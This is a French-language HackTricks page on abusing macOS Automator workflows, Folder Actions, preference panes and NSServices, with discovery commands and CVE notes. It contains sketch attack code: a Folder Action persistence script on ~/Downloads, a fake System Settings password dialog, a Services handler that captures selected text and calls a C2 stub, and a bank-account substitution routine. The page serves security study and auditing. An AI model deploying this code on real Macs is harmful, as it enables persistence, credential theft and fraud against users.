# macOS Automator, Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Actions et workflows Automator

### Informations de base

**Automator** est l’outil d’automatisation visuel de macOS. Il exécute des **workflows** (`.workflow` bundles) composés d’**actions** (`.action` bundles). Automator alimente aussi l’intégration des **Folder Actions**, **Quick Actions**, et **Shortcuts**. Sur les versions modernes de macOS, les workflows peuvent aussi être **importés dans Shortcuts**, donc la même logique malveillante peut apparaître comme une Quick Action du Finder, un service utilisateur sous `~/Library/Services/`, ou un shortcut basé sur d’anciennes actions Automator.

Les actions Automator sont des **plugins** chargés dans le runtime Automator lorsqu’un workflow s’exécute. Elles peuvent :
- Exécuter des scripts shell arbitraires
- Traiter des fichiers et des données
- Interagir avec des applications via AppleScript
- S’enchaîner pour une automatisation complexe

### Pourquoi c’est important

> [!WARNING]
> Les workflows Automator peuvent être **poussés par ingénierie sociale** à s’exécuter — ils apparaissent comme de simples fichiers de document. Un bundle `.workflow` peut contenir des commandes shell intégrées qui s’exécutent lorsque le workflow tourne. Combinés aux Folder Actions, ils fournissent une **persistance automatique** qui se déclenche sur les événements de fichiers. Les corrections récentes de Gatekeeper ont aussi montré que les **Quick Actions intégrées aux apps** (`Contents/PlugIns/*.workflow`) doivent être traitées comme du contenu exécutable, et non comme de simples données inoffensives.

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attack: Workflow d’ingénierie sociale

Un bundle `.workflow` ressemble à un fichier de document normal pour la plupart des utilisateurs :
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attaque : Persistance via Folder Action

Les Folder Actions exécutent automatiquement un workflow lorsque des fichiers sont ajoutés à un dossier surveillé :
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Les Folder Actions persistent après les redémarrages et s’exécutent silencieusement. Un Folder Action sur `~/Downloads` signifie que **chaque fichier téléchargé déclenche votre payload** — y compris les fichiers provenant de Safari, Chrome, AirDrop et des pièces jointes d’e-mail. Notez aussi que `System Events` peut enregistrer des Folder Actions qui pointent vers des scripts en dehors des emplacements par défaut `~/Library/Scripts/Folder Action Scripts`, ce qui rend utile la recherche de chemins non standard. Pour les implications TCC associées, consultez [the TCC page](../macos-security-protections/macos-tcc/README.md).

---

## Preference Panes

### Basic Information

Les preference panes (`.prefPane` bundles) sont des plugins chargés depuis **System Settings** (anciennement System Preferences). Ils fournissent des panneaux d’interface de configuration pour des fonctionnalités système ou tierces. Sur les anciens systèmes, ils étaient chargés directement par **System Preferences** ; sur les versions plus récentes, les panes tierces sont généralement intermédiées par un **legacy loader XPC service** lancé depuis System Settings.

### Why This Matters

- Les preference panes s’exécutent dans un **trusted host process** lancé par System Settings / System Preferences
- Sur les systèmes modernes, ce host peut être un **`legacyLoader` XPC service**, donc la frontière importante reste **trusted Apple UI process -> third-party code loading**
- Les preference panes tierces héritent du **host process security context** et de la confiance utilisateur associée à cette interface
- Les utilisateurs installent les preference panes par **double-clic** — ingénierie sociale facile
- Une fois installées, elles **persistent** et se chargent à chaque ouverture de System Settings sur ce panneau

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attaque : détournement du contexte de privilèges

Un panneau de préférences malveillant hérite du contexte de sécurité de l’**hôte du panneau** (historiquement `System Preferences`, sur les versions récentes souvent un helper `legacyLoader` lancé par `System Settings`) :
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Attaque : Persistance via l’installation
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Attaque : UI Phishing

Un panneau de préférences peut imiter des panneaux système légitimes pour **hameçonner des identifiants** :
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Informations de base

**NSServices** permettent aux applications de fournir des fonctionnalités à d'autres apps via le **menu Services** (clic droit → Services). Lorsqu'un utilisateur sélectionne du texte ou des données et invoque un service, les données sélectionnées sont **envoyées au fournisseur de service** pour traitement.

Les services sont déclarés dans le `Info.plist` d'une application sous la clé `NSServices` et enregistrés auprès du serveur de presse-papiers (`pbs`). macOS conserve aussi un **cache de services** et une **politique de restriction** qui déterminent quels services sont visibles et si les appelants sandboxed doivent recevoir un avertissement supplémentaire.

### Pourquoi c'est important

- Les services reçoivent un **flux de données inter-applications** — le texte sélectionné depuis n'importe quelle application est envoyé au service
- Un service malveillant capture des données provenant de gestionnaires de mots de passe, de clients e-mail, d'applications financières
- Les services peuvent **renvoyer des données modifiées** à l'application appelante (man-in-the-middle sur les opérations de sélection)
- Les noms de services peuvent être conçus pour paraître légitimes ("Format Text", "Encrypt Selection", "Share")
- Le drapeau optionnel `NSRestricted` a une importance pour la sécurité : un service marqué non restreint peut être appelable par une app sandboxed sans l'avertissement que macOS affiche pour les services susceptibles de provoquer une évasion

### Découverte
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Attaque : Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Attaque : Modification des données (Man-in-the-Middle)

Un service peut **modifier les données renvoyées** tout en semblant fournir une fonction légitime :
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Services restreints et abus moderne

Apple prend en charge un booléen `NSRestricted` facultatif par définition de service. S’il est défini, macOS avertit les appelants sandboxed car le service peut les aider à **sortir de la sandbox ou des limites de confidentialité**. D’un point de vue offensif, cela offre deux pistes d’audit utiles :

- Rechercher des **services tiers non marqués comme restreints** alors qu’ils relaient des Apple Events, l’accès aux fichiers ou d’autres actions privilégiées
- Rechercher des **services intégrés à forte valeur** avec des entitlements forts (par exemple, des services exposés par Script Editor ou des helpers liés à Finder) et vérifier si l’interaction utilisateur suffit à les transformer en primitive d’accès aux données

Un bon exemple récent est **CVE-2022-48574**, où le mécanisme Services pouvait être abusé pour atteindre des **fichiers utilisateur protégés par TCC sans le flux de confirmation attendu**. Le bug est corrigé, mais la technique reste utile pour la modélisation de menace : tout service qui relaie un accès aux fichiers ou des requêtes d’automatisation au nom de l’appelant mérite le même niveau de contrôle.

---

## Notes de sécurité récentes

- **Les Quick Actions sont du contenu exécutable** : Apple a corrigé en 2024 un contournement de Gatekeeper où une Automator Quick Action fournie avec une app pouvait s’exécuter sans évaluation normale. Lors de l’audit d’apps, inspectez `Contents/PlugIns/*.workflow/Contents/document.wflow` exactement comme vous inspecteriez des scripts helpers ou des login items. Voir [la page Gatekeeper](../macos-security-protections/macos-gatekeeper.md).
- **Shortcuts peuvent hériter du comportement Automator legacy** : Apple a aussi ajouté une invite supplémentaire de consentement utilisateur après que des shortcuts tiers ont été trouvés en train d’utiliser une **action Automator legacy** pour envoyer des Apple Events sans le flux d’autorisation attendu. Les workflows importés et les bundles de shortcuts doivent être examinés pour `Run AppleScript`, `Run Shell Script` et des actions de pont similaires. Voir [la page TCC](../macos-security-protections/macos-tcc/README.md).
- **Automator reste une frontière de confidentialité active** : Apple a livré un autre correctif Automator en 2025 pour l’accès aux données utilisateur protégées. Même si Automator est une surface legacy, traitez tout workflow runner, hôte de Quick Action ou pont d’automatisation comme une surface d’attaque actuelle plutôt que comme du code mort.

---

## Chaînes d’attaque inter-techniques

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Volet de préférences → Escalade TCC
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Vol de gestionnaire de mots de passe
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Références

* [Apple — About the security content of macOS Ventura 13.7, Sonoma 14.7, and Sequoia 15](https://support.apple.com/en-us/121238)
* [Moonlock — How the NSServices exploit worked on macOS](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
